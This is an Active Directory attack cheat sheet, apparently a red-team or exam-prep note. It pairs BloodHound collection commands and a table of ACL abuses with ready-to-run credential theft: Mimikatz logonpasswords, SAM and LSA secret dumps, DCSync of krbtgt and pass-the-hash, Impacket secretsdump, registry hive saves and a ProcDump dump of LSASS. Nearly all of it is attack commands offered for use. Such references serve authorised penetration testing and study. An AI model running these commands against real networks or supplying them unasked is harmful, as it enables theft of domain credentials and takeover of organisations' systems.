# 🩸 BloodHound & Credential Dumping
#active-directory #bloodhound #credentials #tool

## BloodHound Collection
```bash
# Linux (remote)
bloodhound-python -d <domain> -u <user> -p <pass> -dc <DC_IP> -c All

# Windows (SharpHound)
.\SharpHound.exe -c All --zipfilename output.zip
# Upload zip to BloodHound GUI
```

## Key BloodHound Queries
- *Shortest Paths to Domain Admins*
- *Find All Domain Admins*
- *Shortest Paths from Owned Principals*
- *Find Principals with DCSync Rights*
- *Computers with Unconstrained Delegation*
- *Find AS-REP Roastable Users*
- *Find Kerberoastable Users*

## ACL Abuse Matrix

| ACL Right | Target | Abuse |
|---|---|---|
| GenericAll | User | Reset password / targeted Kerberoast |
| GenericAll | Group | Add self as member |
| GenericAll | Computer | RBCD attack |
| GenericWrite | User | Set SPN → Kerberoast |
| WriteDACL | Domain | Grant self DCSync rights |
| WriteOwner | Object | Take ownership → WriteDACL |
| ForceChangePassword | User | Change password |
| AddMember | Group | Add self |

---

## Mimikatz
```powershell
.\mimikatz.exe

sekurlsa::logonpasswords       # Dump plaintext / NTLM
lsadump::sam                   # SAM hashes
lsadump::dcsync /domain:<domain> /user:krbtgt
lsadump::secrets               # LSA secrets
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe
```

## Secretsdump (Impacket)
```bash
impacket-secretsdump <domain>/<user>:<pass>@<DC_IP>
impacket-secretsdump -hashes :<hash> <domain>/administrator@<DC_IP>
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

## SAM Hive Dump
```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
```

## LSASS Dump
```powershell
.\ProcDump.exe -ma lsass.exe lsass.dmp
# Parse offline:
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
